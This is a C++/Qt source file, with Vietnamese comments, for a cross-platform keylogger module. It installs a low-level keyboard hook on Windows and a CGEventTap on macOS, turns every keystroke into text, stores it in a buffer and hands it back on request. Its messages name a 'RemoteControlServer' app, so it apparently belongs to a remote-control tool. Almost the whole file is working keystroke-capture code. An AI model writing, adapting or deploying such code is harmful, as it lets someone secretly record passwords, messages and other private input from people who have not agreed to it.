#include "KeyloggerModule.h"

#include <QDebug>
#include <QDateTime>

#ifdef Q_OS_WIN
#include <Windows.h>
#endif

#ifdef Q_OS_MACOS
#include <ApplicationServices/ApplicationServices.h>
#endif


//=========================================
// Static members
//=========================================

#ifdef Q_OS_WIN
KeyloggerModule* KeyloggerModule::instance = nullptr;
void* KeyloggerModule::hookHandle = nullptr;
#endif

#ifdef Q_OS_MACOS
KeyloggerModule* KeyloggerModule::instance = nullptr;
#endif


//=========================================
// Constructor / Destructor
//=========================================

KeyloggerModule::KeyloggerModule(QObject *parent)
    : QObject(parent), running(false)
{
#ifdef Q_OS_WIN
    instance = this;
#endif

#ifdef Q_OS_MACOS
    instance = this;
    eventTap = nullptr;
    runLoopSource = nullptr;
    tapThread = nullptr;
#endif
}

KeyloggerModule::~KeyloggerModule()
{
    if (running)
    {
        stopKeylogger();
    }
}


//=========================================
// WINDOWS IMPLEMENTATION
//=========================================

#ifdef Q_OS_WIN

//---------------------------------------------------
// Windows Keyboard Hook Callback
//---------------------------------------------------

long __stdcall KeyloggerModule::keyboardProc(int nCode,
                                              unsigned long long wParam,
                                              long long lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        QString keyText;

        // Map virtual key code to readable string
        switch (vkCode)
        {
        case VK_RETURN:   keyText = "[ENTER]"; break;
        case VK_SPACE:    keyText = " "; break;
        case VK_BACK:     keyText = "[BACKSPACE]"; break;
        case VK_TAB:      keyText = "[TAB]"; break;
        case VK_ESCAPE:   keyText = "[ESC]"; break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:   keyText = "[SHIFT]"; break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: keyText = "[CTRL]"; break;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:    keyText = "[ALT]"; break;
        case VK_CAPITAL:  keyText = "[CAPS]"; break;
        case VK_DELETE:   keyText = "[DEL]"; break;
        case VK_LEFT:     keyText = "[LEFT]"; break;
        case VK_RIGHT:    keyText = "[RIGHT]"; break;
        case VK_UP:       keyText = "[UP]"; break;
        case VK_DOWN:     keyText = "[DOWN]"; break;
        default:
        {
            // Chuyển đổi virtual key thành ký tự
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            WCHAR buffer[4];
            int result = ToUnicode(vkCode, kbStruct->scanCode,
                                   keyboardState, buffer, 4, 0);
            if (result > 0)
            {
                keyText = QString::fromWCharArray(buffer, result);
            }
            else
            {
                keyText = "[VK:" + QString::number(vkCode) + "]";
            }
            break;
        }
        }

        if (instance && !keyText.isEmpty())
        {
            QMutexLocker locker(&instance->mutex);
            instance->keyBuffer.append(keyText);
        }
    }

    return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
}

#endif // Q_OS_WIN


//=========================================
// macOS IMPLEMENTATION
//=========================================

#ifdef Q_OS_MACOS

//---------------------------------------------------
// Kiểm tra Accessibility Permission
// macOS yêu cầu quyền "Input Monitoring" / "Accessibility"
// trong System Settings > Privacy & Security
//---------------------------------------------------

bool KeyloggerModule::checkAccessibilityPermission()
{
    // AXIsProcessTrusted() kiểm tra xem app đã được cấp
    // quyền Accessibility chưa
    bool trusted = AXIsProcessTrusted();

    if (!trusted)
    {
        qDebug() << "Accessibility permission NOT granted!";
        qDebug() << "Please go to: System Settings > Privacy & Security"
                 << "> Accessibility (or Input Monitoring)"
                 << "and enable RemoteControlServer";
    }

    return trusted;
}


//---------------------------------------------------
// CGEventTap Callback
// Được gọi mỗi khi có keyboard event
//---------------------------------------------------

void* KeyloggerModule::eventCallback(void* proxy,
                                      unsigned long type,
                                      void* event,
                                      void* userInfo)
{
    Q_UNUSED(proxy)
    Q_UNUSED(userInfo)

    CGEventRef cgEvent = (CGEventRef)event;
    CGEventType eventType = (CGEventType)type;

    // Chỉ xử lý keyDown events
    if (eventType != kCGEventKeyDown)
    {
        return event;
    }

    // Lấy keycode
    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(
        cgEvent, kCGKeyboardEventKeycode);

    // Lấy ký tự Unicode từ event
    UniChar chars[4];
    UniCharCount actualLength = 0;
    CGEventKeyboardGetUnicodeString(
        cgEvent, 4, &actualLength, chars);

    QString keyText;

    // Map các phím đặc biệt theo macOS keycode
    switch (keyCode)
    {
    case 36:  keyText = "[ENTER]"; break;      // Return
    case 49:  keyText = " "; break;            // Space
    case 51:  keyText = "[BACKSPACE]"; break;   // Delete
    case 48:  keyText = "[TAB]"; break;         // Tab
    case 53:  keyText = "[ESC]"; break;         // Escape
    case 117: keyText = "[DEL]"; break;         // Forward Delete
    case 123: keyText = "[LEFT]"; break;        // Left Arrow
    case 124: keyText = "[RIGHT]"; break;       // Right Arrow
    case 125: keyText = "[DOWN]"; break;        // Down Arrow
    case 126: keyText = "[UP]"; break;          // Up Arrow
    default:
    {
        if (actualLength > 0)
        {
            keyText = QString::fromUtf16(chars, actualLength);
        }
        else
        {
            keyText = "[KEY:" + QString::number(keyCode) + "]";
        }
        break;
    }
    }

    // Lưu vào buffer
    if (instance && !keyText.isEmpty())
    {
        QMutexLocker locker(&instance->mutex);
        instance->keyBuffer.append(keyText);
    }

    return event;
}


//---------------------------------------------------
// Chạy CFRunLoop trong thread riêng
// CGEventTap cần run loop để nhận events
//---------------------------------------------------

void KeyloggerModule::runMacEventLoop()
{
    // Tạo event tap để theo dõi keyboard
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);

    CFMachPortRef tap = CGEventTapCreate(
        kCGSessionEventTap,          // Tap vào session events
        kCGHeadInsertEventTap,       // Chèn vào đầu
        kCGEventTapOptionListenOnly, // Chỉ lắng nghe, không chặn
        eventMask,
        (CGEventTapCallBack)eventCallback,
        nullptr
    );

    if (!tap)
    {
        qDebug() << "Failed to create CGEventTap!";
        qDebug() << "Make sure Accessibility permission is granted.";
        return;
    }

    eventTap = (void*)tap;

    // Tạo run loop source từ event tap
    CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault, tap, 0);

    runLoopSource = (void*)source;

    // Thêm vào run loop hiện tại của thread này
    CFRunLoopAddSource(CFRunLoopGetCurrent(), source,
                       kCFRunLoopCommonModes);

    // Bật event tap
    CGEventTapEnable(tap, true);

    qDebug() << "macOS CGEventTap started, listening for keys...";

    // Chạy run loop (blocking cho đến khi stop)
    CFRunLoopRun();

    // Cleanup sau khi run loop dừng
    qDebug() << "macOS event loop stopped.";
}

#endif // Q_OS_MACOS


//=========================================
// PUBLIC METHODS (Cross-platform)
//=========================================

//---------------------------------------------------
// Bắt đầu ghi phím
//---------------------------------------------------

QString KeyloggerModule::startKeylogger()
{
    if (running)
    {
        return "FAIL: Keylogger already running";
    }

#ifdef Q_OS_WIN
    hookHandle = (void*)SetWindowsHookEx(WH_KEYBOARD_LL,
                                          (HOOKPROC)keyboardProc,
                                          GetModuleHandle(NULL),
                                          0);
    if (hookHandle == nullptr)
    {
        qDebug() << "Failed to set keyboard hook!";
        return "FAIL: Cannot set keyboard hook";
    }

    running = true;
    keyBuffer.clear();

    qDebug() << "Keylogger started (Windows).";
    return "SUCCESS";

#elif defined(Q_OS_MACOS)
    // Kiểm tra quyền Accessibility trước
    if (!checkAccessibilityPermission())
    {
        return "FAIL: Accessibility permission required. "
               "Go to System Settings > Privacy & Security > "
               "Accessibility and enable RemoteControlServer.";
    }

    keyBuffer.clear();

    // Chạy event tap trong thread riêng
    // (CFRunLoop cần chạy liên tục)
    tapThread = QThread::create([this]()
    {
        runMacEventLoop();
    });

    tapThread->start();
    running = true;

    qDebug() << "Keylogger started (macOS).";
    return "SUCCESS";

#else
    return "FAIL: Keylogger not supported on this OS";
#endif
}


//---------------------------------------------------
// Dừng ghi phím
//---------------------------------------------------

QString KeyloggerModule::stopKeylogger()
{
    if (!running)
    {
        return "FAIL: Keylogger not running";
    }

#ifdef Q_OS_WIN
    if (hookHandle)
    {
        UnhookWindowsHookEx((HHOOK)hookHandle);
        hookHandle = nullptr;
    }
#endif

#ifdef Q_OS_MACOS
    // Dừng event tap
    if (eventTap)
    {
        CGEventTapEnable((CFMachPortRef)eventTap, false);
    }

    // Dừng run loop của thread
    if (tapThread && tapThread->isRunning())
    {
        // CFRunLoopStop dừng CFRunLoopRun() trong thread
        // Cần dispatch vào run loop của thread đó
        CFRunLoopStop(CFRunLoopGetMain());

        tapThread->quit();
        tapThread->wait(3000);

        if (tapThread->isRunning())
        {
            tapThread->terminate();
            tapThread->wait(1000);
        }
    }

    // Cleanup
    if (runLoopSource)
    {
        CFRelease((CFRunLoopSourceRef)runLoopSource);
        runLoopSource = nullptr;
    }
    if (eventTap)
    {
        CFRelease((CFMachPortRef)eventTap);
        eventTap = nullptr;
    }

    delete tapThread;
    tapThread = nullptr;
#endif

    running = false;

    qDebug() << "Keylogger stopped.";
    return "SUCCESS";
}


//---------------------------------------------------
// Lấy dữ liệu đã ghi
//---------------------------------------------------

QString KeyloggerModule::getKeyloggerData()
{
    QMutexLocker locker(&mutex);

    if (keyBuffer.isEmpty())
    {
        return "(No keys recorded)";
    }

    QString data = keyBuffer.join("");
    return data;
}


//---------------------------------------------------
// Kiểm tra trạng thái
//---------------------------------------------------

bool KeyloggerModule::isRunning() const
{
    return running;
}
